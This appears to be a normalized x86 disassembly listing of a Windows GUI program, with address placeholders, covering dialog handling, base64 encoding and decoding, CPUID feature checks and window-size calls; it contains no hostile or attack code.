push 0xffffffff
push eax
mov ecx rw-data
call sub_401ba0
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
push ecx
push eax
push 0x416
push esi
call ebp
push 0x1
push esi
call [ EndDialog@IAT ]
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
mov eax rw-data
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
sub_4a8dd0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1db1
push eax
mov eax 0x10070
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
xor ebx ebx
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] bl
mov eax [ rw-data ]
cmp eax 0x1
mov [ esp + 0x1007c ] ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0xffffffff
push ebx
push rw-data
jmp r-xdata
mov ecx [ esp + 0x10074 ]
xor al al
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
push 0xffffffff
push ebx
push rw-data
lea ecx [ esp + 0x14 ]
call sub_401dd0
mov eax [ esp + 0x10084 ]
push esi
mov esi [ rw-data ]
push eax
mov [ rw-data ] eax
lea eax [ esp + 0x10 ]
push 0xffffffff
push eax
call sub_40e460
add esp 0xc
lea ecx [ esp + 0x4c ]
mov [ rw-data ] esi
call sub_438500
mov eax [ esp + 0x24 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x10 ]
mov [ esp + 0x10080 ] 0x1
jae r-xdata
push eax
lea ecx [ esp + 0x50 ]
call j_sub_44f660
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x28 ] 0x76
lea ecx [ esp + 0x28 ]
push ecx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x10084 ] 0x2
call sub_439260
lea ecx [ esp + 0x28 ]
call sub_40b120
mov [ esp + 0xb ] al
cmp [ esp + 0x48 ] esi
jb r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x10080 ] bl
call sub_44f5f0
cmp [ esp + 0x24 ] esi
pop esi
jb r-xdata
mov edx [ esp + 0x34 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov al [ esp + 0x7 ]
pop ebx
mov ecx [ esp + 0x10070 ]
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
mov eax [ esp + 0xc ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4a8f50
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1db1
push eax
mov eax 0x10070
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
xor ebx ebx
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] bl
mov eax [ rw-data ]
cmp eax 0x1
mov [ esp + 0x1007c ] ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0xffffffff
push ebx
push rw-data
jmp r-xdata
mov ecx [ esp + 0x10074 ]
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
push 0xffffffff
push ebx
push rw-data
lea ecx [ esp + 0x14 ]
call sub_401dd0
mov eax [ esp + 0x10084 ]
mov edx [ rw-data ]
push eax
mov [ rw-data ] eax
lea eax [ esp + 0xc ]
cmp edx ebx
push 0xffffffff
push eax
setne [ esp + 0x13 ]
call sub_40e460
movzx ecx [ esp + 0x13 ]
mov [ rw-data ] ecx
add esp 0xc
lea ecx [ esp + 0x48 ]
call sub_438500
cmp [ esp + 0x20 ] 0x10
mov eax [ esp + 0xc ]
mov [ esp + 0x1007c ] 0x1
jae r-xdata
push edi
push eax
lea ecx [ esp + 0x50 ]
call j_sub_44f660
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x28 ] 0x76
lea edx [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x10084 ] 0x2
call sub_439260
lea ecx [ esp + 0x28 ]
call sub_40b1a0
mov edi eax
cmp [ esp + 0x48 ] 0x10
jb r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x10080 ] bl
call sub_44f5f0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov eax [ esp + 0x34 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax edi
pop edi
pop ebx
mov ecx [ esp + 0x10070 ]
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_4a90d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1db1
push eax
mov eax 0x10070
mov [ fs : 0x0 ] esp
call sub_4b6180
push ebx
xor ebx ebx
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] ebx
mov [ esp + 0xc ] bl
mov eax [ rw-data ]
cmp eax 0x1
mov [ esp + 0x1007c ] ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0xffffffff
push ebx
push rw-data
jmp r-xdata
mov ecx [ esp + 0x10074 ]
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
push 0xffffffff
push ebx
push rw-data
lea ecx [ esp + 0x14 ]
call sub_401dd0
mov eax [ esp + 0x10084 ]
mov edx [ rw-data ]
push eax
mov [ rw-data ] eax
lea eax [ esp + 0xc ]
cmp edx ebx
push 0xffffffff
push eax
setne [ esp + 0x13 ]
call sub_40e460
movzx ecx [ esp + 0x13 ]
mov [ rw-data ] ecx
add esp 0xc
lea ecx [ esp + 0x48 ]
call sub_438500
cmp [ esp + 0x20 ] 0x10
mov eax [ esp + 0xc ]
mov [ esp + 0x1007c ] 0x1
jae r-xdata
push edi
push eax
lea ecx [ esp + 0x50 ]
call j_sub_44f660
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x28 ] 0x76
lea edx [ esp + 0x28 ]
push edx
lea ecx [ esp + 0x50 ]
mov [ esp + 0x10084 ] 0x2
call sub_439260
lea ecx [ esp + 0x28 ]
call sub_40b1a0
mov edi eax
cmp [ esp + 0x48 ] 0x10
jb r-xdata
lea eax [ esp + 0xc ]
lea ecx [ esp + 0x4c ]
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
mov [ esp + 0x10080 ] bl
call sub_44f5f0
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov eax [ esp + 0x34 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax edi
pop edi
pop ebx
mov ecx [ esp + 0x10070 ]
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
mov ecx [ esp + 0x10 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
sub_4a9250
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c1db1
push eax
mov eax 0x10070
mov [ fs : 0x0 ] esp
call sub_4b6180
push esi
mov esi [ esp + 0x10084 ]
push esi
call sub_4a8dd0
add esp 0x4
test al al
je r-xdata
push ebx
push edi
xor ebx ebx
push 0xffffffff
push ebx
push rw-data
lea ecx [ esp + 0x1c ]
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] ebx
mov [ esp + 0x20 ] bl
call sub_401dd0
mov al [ rw-data ]
mov edi [ rw-data ]
push esi
lea ecx [ esp + 0x14 ]
push 0xffffffff
push ecx
mov [ esp + 0x10090 ] ebx
mov [ esp + 0x1b ] al
mov [ rw-data ] esi
mov [ rw-data ] bl
call sub_40e460
mov dl [ esp + 0x1b ]
add esp 0xc
lea ecx [ esp + 0x50 ]
mov [ rw-data ] edi
mov [ rw-data ] dl
call sub_438500
mov eax [ esp + 0x28 ]
mov esi 0x10
cmp eax esi
mov eax [ esp + 0x14 ]
mov [ esp + 0x10084 ] 0x1
jae r-xdata
xor al al
pop esi
mov ecx [ esp + 0x10070 ]
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
push eax
lea ecx [ esp + 0x54 ]
call j_sub_44f660
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
mov [ esp + 0x2c ] 0x76
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0x10088 ] 0x2
call sub_439260
lea ecx [ esp + 0x2c ]
call sub_40b120
mov [ esp + 0xf ] al
cmp [ esp + 0x4c ] esi
jb r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x50 ]
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] ebx
mov [ esp + 0x38 ] bl
mov [ esp + 0x10084 ] bl
call sub_44f5f0
cmp [ esp + 0x28 ] esi
pop edi
pop ebx
jb r-xdata
mov ecx [ esp + 0x38 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x10074 ]
mov al [ esp + 0x7 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x1007c
retn
mov edx [ esp + 0xc ]
push edx
call j_sub_4b66ed#2
add esp 0x4
sub_4a93d0
xor eax eax
mov al [ esp + 0x4 ]
cmp al 0x19
ja r-xdata
cmp al 0x1a
jb r-xdata
add eax 0x41
retn
cmp al 0x34
jb r-xdata
cmp al 0x33
ja r-xdata
cmp al 0x3e
jne r-xdata
cmp al 0x3d
ja r-xdata
add eax 0x47
retn
cmp al 0x3f
setne al
dec al
and al 0xf2
add al 0x3d
retn
mov al 0x2b
retn
sub eax 0x4
retn
sub_4a9410
xor eax eax
mov al [ esp + 0x4 ]
cmp al 0x41
jl r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jg r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x7a
jg r-xdata
sub eax 0x41
retn
cmp al 0x2b
jne r-xdata
cmp al 0x39
jg r-xdata
sub eax 0x47
retn
cmp al 0x2f
setne al
dec al
and eax 0x3f
retn
mov al 0x3e
retn
add eax 0x4
retn
sub_4a9450
mov eax [ esp + 0xc ]
test eax eax
jle r-xdata
retn
mov ecx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
lea edi [ eax - 0x1 ]
inc esi
shr edi 0x2
inc ecx
inc edi
nop
xor eax eax
mov al [ ecx - 0x1 ]
push eax
call sub_4a9410
mov dl al
xor eax eax
mov al [ ecx ]
shl dl 0x2
push eax
call sub_4a9410
shr al 0x4
and al 0x3
or dl al
mov [ esi - 0x1 ] dl
xor edx edx
mov dl [ ecx + 0x1 ]
push edx
call sub_4a9410
mov dl al
xor eax eax
mov al [ ecx ]
shr dl 0x2
and dl 0xf
push eax
call sub_4a9410
shl al 0x4
or dl al
mov [ esi ] dl
xor edx edx
mov dl [ ecx + 0x2 ]
push edx
call sub_4a9410
mov dl al
xor eax eax
mov al [ ecx + 0x1 ]
and dl 0x3f
push eax
call sub_4a9410
shl al 0x6
or dl al
mov [ esi + 0x1 ] dl
add esp 0x18
add ecx 0x4
add esi 0x3
dec edi
jne r-xdata
pop edi
pop esi
sub_4a94f0
sub esp 0x8
push ebx
mov ebx [ esp + 0x18 ]
push esi
xor ecx ecx
xor esi esi
test ebx ebx
jle r-xdata
pop esi
pop ebx
add esp 0x8
retn
push ebp
mov ebp [ esp + 0x1c ]
push edi
mov edi [ esp + 0x1c ]
mov eax 0x1
sub eax edi
mov [ esp + 0x10 ] eax
mov eax 0x2
sub eax edi
mov [ esp + 0x14 ] eax
xor eax eax
mov al [ ecx + edi ]
and al 0x3
shl al 0x4
push eax
call sub_4a93d0
add esp 0x4
mov [ esi + ebp + 0x1 ] al
mov al 0x3d
pop edi
mov [ esi + ebp + 0x3 ] al
mov [ esi + ebp + 0x2 ] al
pop ebp
pop esi
pop ebx
add esp 0x8
retn
mov bl [ ecx + edi + 0x1 ]
xor eax eax
mov al [ edx ]
and al 0x3
shl al 0x4
shr bl 0x4
add al bl
push eax
call sub_4a93d0
mov ebx [ esp + 0x28 ]
mov [ esi + ebp + 0x1 ] al
mov eax [ esp + 0x18 ]
add eax edx
add esp 0x4
cmp eax ebx
je r-xdata
movzx ecx [ ecx + edi + 0x1 ]
and cl 0xf
shl cl 0x2
push ecx
call sub_4a93d0
add esp 0x4
pop edi
mov [ esi + ebp + 0x3 ] 0x3d
mov [ esi + ebp + 0x2 ] al
pop ebp
mov al [ ecx + edi + 0x2 ]
xor edx edx
mov dl [ ecx + edi + 0x1 ]
and dl 0xf
shl dl 0x2
shr al 0x6
add dl al
push edx
call sub_4a93d0
mov [ esi + ebp + 0x2 ] al
xor edx edx
mov dl [ ecx + edi + 0x2 ]
and edx 0xffffff3f
push edx
call sub_4a93d0
mov [ esi + ebp + 0x3 ] al
add ecx 0x3
add esp 0x8
add esi 0x4
cmp ecx ebx
jl r-xdata
xor eax eax
mov al [ ecx + edi ]
lea edx [ ecx + edi ]
shr al 0x2
push eax
call sub_4a93d0
mov [ esi + ebp ] al
mov eax [ esp + 0x14 ]
add eax edx
add esp 0x4
cmp eax ebx
je r-xdata
pop edi
pop ebp
pop esi
pop ebx
add esp 0x8
retn
sub_4a9610
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
xor eax eax
cpuid
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4a9690
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
dec eax
cmp eax 0x7
ja r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4a9788 ]
xorps xmm0 xmm0
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xorpd xmm0 xmm0
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
femms
pfrcp mmx0 mmx0
femms
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pxor mmx0 mmx0
emms
sub_4a97b0
push esi
mov esi [ esp + 0x10 ]
push edi
push 0xc
push esi
push r--data
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
push 0xc
push esi
push r--data
call sub_4b69f0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
sub eax 0x4
je r-xdata
push 0xc
push esi
push r--data
call sub_4b69f0
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
sub eax 0x4
je r-xdata
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov cx [ r--data ]
pop edi
mov [ eax + 0x8 ] cx
pop esi
retn
dec eax
je r-xdata
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
push 0xc
push esi
push r--data
call sub_4b69f0
add esp 0xc
mov eax [ esp + 0x10 ]
cmp eax 0x8
ja r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0xf
ja r-xdata
dec eax
jne r-xdata
jmp [ eax * 4 + jump_table_4a9c30 ]
mov eax [ esp + 0x10 ]
test eax eax
jle r-xdata
dec eax
jne r-xdata
movzx eax [ eax + lookup_table_4a9c00 ]
jmp [ eax * 4 + jump_table_4a9bec ]
pop edi
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov cx [ r--data ]
mov [ eax + 0x8 ] cx
mov dl [ r--data ]
pop edi
mov [ eax + 0xa ] dl
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
pop edi
mov [ eax + 0x8 ] ecx
pop esi
retn
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
mov [ edx ] eax
mov ecx [ r--data ]
mov [ edx + 0x4 ] ecx
mov eax [ r--data ]
pop edi
mov [ edx + 0x8 ] eax
pop esi
retn
mov edx [ r--data ]
mov ecx [ esp + 0x18 ]
mov [ ecx ] edx
mov eax [ r--data ]
mov [ ecx + 0x4 ] eax
mov edx [ r--data ]
mov [ ecx + 0x8 ] edx
mov al [ r--data ]
pop edi
mov [ ecx + 0xc ] al
pop esi
retn
mov edx [ r--data ]
mov ecx [ esp + 0x18 ]
mov [ ecx ] edx
mov eax [ r--data ]
mov [ ecx + 0x4 ] eax
mov edx [ r--data ]
pop edi
mov [ ecx + 0x8 ] edx
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dl [ r--data ]
pop edi
mov [ eax + 0xc ] dl
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dx [ r--data ]
pop edi
mov [ eax + 0xc ] dx
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov dl [ r--data ]
pop edi
mov [ eax + 0xc ] dl
pop esi
retn
cmp eax 0x3
jle r-xdata
mov eax [ esp + 0x10 ]
dec eax
cmp eax 0x7
ja r-xdata
mov edx [ r--data ]
mov ecx [ esp + 0x18 ]
mov [ ecx ] edx
mov ax [ r--data ]
mov [ ecx + 0x4 ] ax
mov dl [ r--data ]
pop edi
mov [ ecx + 0x6 ] dl
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov dx [ r--data ]
mov [ eax + 0x4 ] dx
mov cl [ r--data ]
pop edi
mov [ eax + 0x6 ] cl
pop esi
retn
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
mov [ edx ] eax
mov ecx [ r--data ]
mov [ edx + 0x4 ] ecx
mov al [ r--data ]
pop edi
mov [ edx + 0x8 ] al
pop esi
retn
mov edx [ r--data ]
mov ecx [ esp + 0x18 ]
mov [ ecx ] edx
mov eax [ r--data ]
mov [ ecx + 0x4 ] eax
mov dl [ r--data ]
pop edi
mov [ ecx + 0x8 ] dl
pop esi
retn
mov edx [ r--data ]
mov ecx [ esp + 0x18 ]
mov [ ecx ] edx
mov eax [ r--data ]
mov [ ecx + 0x4 ] eax
mov edx [ r--data ]
mov [ ecx + 0x8 ] edx
mov ax [ r--data ]
pop edi
mov [ ecx + 0xc ] ax
pop esi
retn
cmp eax 0x4
jne r-xdata
mov edx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] edx
mov ecx [ r--data ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
retn
jmp [ eax * 4 + jump_table_4a9c10 ]
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
mov [ edx ] eax
mov ecx [ r--data ]
mov [ edx + 0x4 ] ecx
mov eax [ r--data ]
mov [ edx + 0x8 ] eax
mov ecx [ r--data ]
mov [ edx + 0xc ] ecx
mov ax [ r--data ]
pop edi
mov [ edx + 0x10 ] ax
pop esi
retn
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
mov [ edx ] eax
mov ecx [ r--data ]
mov [ edx + 0x4 ] ecx
mov eax [ r--data ]
mov [ edx + 0x8 ] eax
mov ecx [ r--data ]
mov [ edx + 0xc ] ecx
mov ax [ r--data ]
pop edi
mov [ edx + 0x10 ] ax
pop esi
retn
mov edx [ r--data ]
mov ecx [ esp + 0x18 ]
mov [ ecx ] edx
mov eax [ r--data ]
mov [ ecx + 0x4 ] eax
mov edx [ r--data ]
mov [ ecx + 0x8 ] edx
mov eax [ r--data ]
mov [ ecx + 0xc ] eax
mov dl [ r--data ]
pop edi
mov [ ecx + 0x10 ] dl
pop esi
retn
mov ecx [ r--data ]
mov eax [ esp + 0x18 ]
mov [ eax ] ecx
mov edx [ r--data ]
mov [ eax + 0x4 ] edx
mov ecx [ r--data ]
mov [ eax + 0x8 ] ecx
mov edx [ r--data ]
mov [ eax + 0xc ] edx
mov cl [ r--data ]
pop edi
mov [ eax + 0x10 ] cl
pop esi
retn
mov eax [ r--data ]
mov edx [ esp + 0x18 ]
mov [ edx ] eax
mov ecx [ r--data ]
mov [ edx + 0x4 ] ecx
mov eax [ r--data ]
mov [ edx + 0x8 ] eax
mov cx [ r--data ]
pop edi
mov [ edx + 0xc ] cx
pop esi
retn
mov edi [ esp + 0x18 ]
mov ecx 0x6
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
retn
mov edi [ esp + 0x18 ]
mov ecx 0x7
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
pop edi
pop esi
retn
sub_4a9c60
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] esi
call sub_4a9610
test eax eax
jne r-xdata
push ebx
push ecx
push edx
xor eax eax
cpuid
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edx
mov eax 0x80000000
cpuid
cmp eax 0x80000000
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop ecx
pop ebx
pop edx
mov edi [ ebp - 0x8 ]
test edi 0x800000
je r-xdata
mov eax 0x80000001
cpuid
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
test eax eax
jns r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x1
call sub_4a9690
add esp 0x4
test eax eax
je r-xdata
test edi 0x2000000
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x8
push 0x8
mov [ ebp - 0x4 ] eax
call sub_4a9690
add esp 0x4
test eax eax
je r-xdata
mov esi 0x1
test edi 0x4000000
je r-xdata
mov eax [ ebp - 0x4 ]
or eax 0x2
push 0x2
mov [ ebp - 0x4 ] eax
call sub_4a9690
add esp 0x4
test eax eax
je r-xdata
or esi 0x8
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x4 ]
or ebx 0x4
push 0x4
mov [ ebp - 0x4 ] ebx
call sub_4a9690
add esp 0x4
test eax eax
je r-xdata
or esi 0x2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx 0x11
mov edi ebx
[ edi ]
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x38 ] eax
mov eax [ ebp - 0x10 ]
mov ecx eax
mov edx eax
shr ecx 0x8
shr edx 0x4
and ecx 0xf
and edx 0xf
and eax 0xf
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x2c ] ecx
mov edx ebx
lea ecx [ ebp - 0x24 ]
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x3c ] esi
mov [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x24 ]
sub edx ecx
or esi 0x4
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ ebx + 0x2c ]
lea edx [ ebx + 0xd ]
push edx
push ebx
push eax
push ecx
call sub_4a97b0
add esp 0x10
mov [ ebx + 0x40 ] 0xf
sub_4a9dd0
mov eax [ esp + 0xc ]
sub esp 0x10
test eax eax
push esi
mov esi [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
mov [ esp + 0x20 ] esi
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
cmp eax 0x1
je r-xdata
mov ecx [ esp + 0x20 ]
xor edx edx
cmp ecx esi
setge dl
mov [ esp + 0x8 ] eax
mov al [ rw-data ]
mov [ esp + 0x7 ] al
push ebx
mov eax esi
sub eax ecx
lea edx [ edx + edx - 0x1 ]
push ebp
mov ebp edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
push edi
jle r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x1c ]
mov [ eax ] 0xffffffff
mov [ ecx ] 0xffffffff
pop esi
add esp 0x10
retn
mov al [ esp + 0x13 ]
test al al
je r-xdata
xor esi esi
push esi
push esi
push esi
push esi
call sub_4706c0
add esp 0x10
test eax eax
jge r-xdata
test ebp ebp
lea eax [ esi + 0x1 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] eax
jl r-xdata
mov [ esp + 0x14 ] 0x1
push 0x0
call sub_4a9250
add esp 0x4
test al al
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
pop edi
pop ebp
pop ebx
mov [ ecx ] 0xfffffffe
mov [ edx ] 0xfffffffe
pop esi
add esp 0x10
retn
cmp [ esp + 0x2c ] esi
jge r-xdata
cmp [ esp + 0x14 ] 0x2
jne r-xdata
mov [ esp + 0x14 ] 0x1
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x14 ] 0x2
je r-xdata
test ebp ebp
jge r-xdata
test ebp ebp
jle r-xdata
test ebp ebp
jl r-xdata
add esi ebp
mov ebp 0x1
mov [ esp + 0x13 ] 0x1
jmp r-xdata
mov edi [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
test esi esi
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov edi eax
jne r-xdata
xor ebx ebx
lea edi [ esp + 0x18 ]
mov [ esp + 0x13 ] 0x0
cmp [ esp + 0x2c ] esi
jg r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
pop edi
pop ebp
pop ebx
mov [ ecx ] 0xffffffff
mov [ edx ] 0xffffffff
pop esi
add esp 0x10
retn
cmp [ esp + 0x14 ] 0x1
jne r-xdata
cmp [ esp + 0x14 ] 0x2
jne r-xdata
test esi esi
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ eax ] edx
mov dl [ esp + 0x13 ]
test dl dl
mov [ ecx ] edi
je r-xdata
cmp [ esp + 0x13 ] 0x1
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push esi
mov [ edi ] esi
call sub_4706c0
add esp 0x10
test eax eax
jge r-xdata
mov edx [ eax ]
cmp edx [ rw-data ]
jl r-xdata
mov [ ecx ] 0xffffffff
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x24 ]
mov [ ecx ] edx
mov [ eax ] edi
jmp r-xdata
mov [ esp + 0x13 ] 0x1
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ ecx ] eax
jl r-xdata
mov [ eax ] 0xfffffffe
cmp [ esp + 0x14 ] 0x1
je r-xdata
push esi
call sub_4a9250
add esp 0x4
test al al
je r-xdata
mov eax [ esp + 0x2c ]
add esi ebp
cmp eax esi
je r-xdata
pop edi
pop ebp
pop ebx
pop esi
add esp 0x10
retn
mov [ ecx ] 0xfffffffe
inc ebx
add edi 0x4
cmp ebx 0x2
jl r-xdata
mov [ esp + 0x14 ] 0x1
jmp r-xdata
mov [ esp + 0x14 ] 0x2
jmp r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
pop edi
pop ebp
pop ebx
mov [ edx ] 0xfffffffe
mov [ eax ] 0xfffffffe
pop esi
add esp 0x10
retn
test esi esi
jl r-xdata
mov ecx [ rw-data ]
add esi ebp
dec ecx
cmp esi ecx
je r-xdata
jmp r-xdata
cmp esi [ rw-data ]
jge r-xdata
push 0x0
push 0x0
push 0x0
push esi
mov [ edi ] esi
call sub_4706c0
add esp 0x10
test eax eax
jl r-xdata
sub_4aa0f0
mov eax [ rw-data ]
sub esp 0x10
test eax eax
jne r-xdata
push esi
push edi
lea ecx [ esp + 0x8 ]
push ecx
push eax
call [ GetClientRect@IAT ]
mov edx [ rw-data ]
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push 0xfffffff0
push edx
sub esi ecx
call [ GetWindowLongA@IAT ]
push 0x2
mov edi eax
